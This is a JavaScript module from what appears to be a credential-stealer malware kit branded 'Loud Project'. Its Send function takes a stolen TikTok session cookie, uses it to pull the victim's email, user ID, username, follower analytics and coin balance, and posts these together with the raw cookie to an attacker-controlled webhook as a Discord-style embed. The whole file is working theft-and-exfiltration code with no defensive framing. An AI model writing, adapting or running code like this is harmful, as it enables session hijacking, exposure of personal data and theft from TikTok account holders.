const axios = require("axios");
const { wbk } = require("../../data/Config");
const tiktoksCookies = [];


async function Send(secret_cookie) {
  if (tiktoksCookies.includes(secret_cookie)) return;
  tiktoksCookies.push(secret_cookie);

  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, compress, deflate, br",
    cookie: `sessionid=${secret_cookie}`,
  };

  const accountInfo = await axios
    .get(
      "https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE",
      { headers }
    )
    .then((response) => response.data)
    .catch(() => null);
  if (!accountInfo || !accountInfo.data || !accountInfo.data.username) return;

  const insights = await axios
    .post(
      "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
      "type_requests=[{'insigh_type':'vv_history','days':16},{'insigh_type':'pv_history','days':16},{'insigh_type':'like_history','days':16},{'insigh_type':'comment_history','days':16},{'insigh_type':'share_history','days':16},{'insigh_type':'user_info'},{'insigh_type':'follower_num_history','days':17},{'insigh_type':'follower_num'},{'insigh_type':'week_new_videos','days':7},{'insigh_type':'week_incr_video_num'},{'insigh_type':'self_rooms','days':28},{'insigh_type':'user_live_cnt_history','days':58},{'insigh_type':'room_info'}]",
      { headers: { cookie: `sessionid=${secret_cookie}` } }
    )
    .then((response) => response.data)
    .catch(() => null);

  const wallet = await axios
    .get(
      "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
      { headers: { cookie: `sessionid=${secret_cookie}` } }
    )
    .then((response) => response.data)
    .catch(() => null);

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            {
              name: "Profile URL",
              value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
              inline: true,
            },
            {
              name: "ID",
              value: `\`${accountInfo.data.user_id_str || "Not available"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${accountInfo.data.email || "None"}\``,
              inline: true,
            },
            {
              name: "Username",
              value: `\`${accountInfo.data.username || "Username not available"}\``,
              inline: true,
            },
            {
              name: "Followers Count",
              value: `\`${insights?.follower_num?.value || "Not available"}\``,
              inline: true,
            },
            {
              name: "Coins",
              value: `\`${wallet?.data?.coins || "0"}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${secret_cookie || "Not found"}\`\`\``,
            },
          ],
          color: 13172927,
          thumbnail: {
            url: `${accountInfo.data.avatar_url}`,
          },
          author: {
            name: "TikTok Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    })
    .catch(() => null);
}

module.exports = { Send }